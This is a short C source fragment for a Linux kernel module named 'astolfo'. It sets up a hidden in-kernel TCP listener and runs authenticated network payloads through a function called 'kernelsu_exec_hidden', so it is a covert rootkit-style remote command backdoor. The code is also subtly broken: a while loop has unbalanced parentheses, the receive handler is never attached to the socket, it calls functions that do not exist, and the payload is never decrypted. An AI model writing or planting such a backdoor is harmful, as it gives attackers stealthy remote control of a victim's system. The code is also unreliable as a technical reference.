#include <linux/net.h>

#define ASTOLFO_PORT 0xA5F0

static struct socket *astolfo_sock;

static void astolfo_receive(struct sock *sk)
{
    struct astolfo_sb_info *sbi = astolfo_get_super()->s_fs_info;
    struct sk_buff *skb;
    u8 nonce[12], tag[16];
    
    while ((skb = skb_dequeue(&sk->sk_receive_queue)) {
        // Extract encrypted payload
        skb_copy_bits(skb, 0, nonce, sizeof(nonce));
        skb_copy_bits(skb, 12, tag, sizeof(tag));
        
        if (crypto_aead_verify(sbi->aead, nonce, tag)) {
            kernelsu_exec_hidden(skb->data + 28);
        }
    }
}

static int __init astolfo_comms_init(void)
{
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(ASTOLFO_PORT),
    };
    
    sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &astolfo_sock);
    kernel_bind(astolfo_sock, (struct sockaddr *)&addr, sizeof(addr));
    kernel_listen(astolfo_sock, 5);
    
    return 0;
}
